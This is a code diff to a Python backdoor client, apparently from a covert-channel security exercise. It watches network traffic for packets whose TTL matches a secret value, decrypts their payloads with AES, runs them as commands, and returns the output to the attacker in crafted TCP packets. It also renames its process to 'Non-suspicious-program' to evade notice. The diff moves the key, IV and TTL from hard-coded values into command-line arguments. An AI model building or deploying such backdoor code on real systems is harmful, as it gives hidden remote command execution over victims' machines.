@@ -33,8 +33,31 @@ import setproctitle
 
 global clientIP
 global listening
+global ttlKey
+global decryptionKey
+global IV
 
-
+def usage():
+    global ttlKey
+    global decryptionKey
+    global IV
+    if len(sys.argv) < 4:
+        print "Please use format python client.py <ttlkey> <decryptionKey> <IV>"
+        sys.exit()
+    else:
+        if len(sys.argv[2]) < 16:
+            print "Please ensure decryption key is 16 characters in length"
+            sys.exit()
+        if len(sys.argv[3]) < 16:
+            print "Please ensure that the IV is 16 characters in legnth"
+            sys.exit()
+        global ttlKey
+        ttlKey  = int(sys.argv[1])
+        print "ttlKey is " + str(ttlKey)
+        decryptionKey = sys.argv[2]
+        print "Decryption key is " + decryptionKey
+        IV = sys.argv[3]
+        print "IV is " + IV
 
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 --  FUNCTION
@@ -50,7 +73,12 @@ global listening
 --      and decrypts is using the same key and IV used at the attackers system.
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 def decryptCommand(command):
-    decryptor = AES.new("0123456789abcdef", AES.MODE_CFB, IV="abcdefghijklmnop")
+    global decryptionKey
+    decryptionKey = decryptionKey
+    print "decryptionKey is " + decryptionKey
+    global IV
+    IV = IV
+    decryptor = AES.new(decryptionKey, AES.MODE_CFB, IV=IV)
     plain = decryptor.decrypt(command)
     return plain
 
@@ -68,10 +96,11 @@ def decryptCommand(command):
 --      and decrypts is using the same key and IV used at the attackers system.
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 def receivedPacket(packet):
+    global ttlKey
     if IP in packet[0]:
         #Authenticate that the packets are actually from the attacker
         # Key is TTL 71
-        if packet[IP].ttl ==71:
+        if packet[IP].ttl == ttlKey:
             srcIP = packet[IP].src
             srcPort = packet[TCP].sport
             command = decryptCommand(packet["Raw"].load)
@@ -80,7 +109,7 @@ def receivedPacket(packet):
             result = f.read()
             if result == "":
                 result = "ERROR or No Output Produced"
-            newPacket = (IP(dst=srcIP, ttl=71)/TCP(sport=80, dport=srcPort)/result)
+            newPacket = (IP(dst=srcIP, ttl=ttlKey)/TCP(sport=80, dport=srcPort)/result)
             send(newPacket, verbose = False)
             return True
         else:
@@ -88,6 +117,7 @@ def receivedPacket(packet):
 
 
 if __name__ == "__main__":
+    usage()
     #Set process title to something less suspicious
     setproctitle.setproctitle("Non-suspicious-program")
 
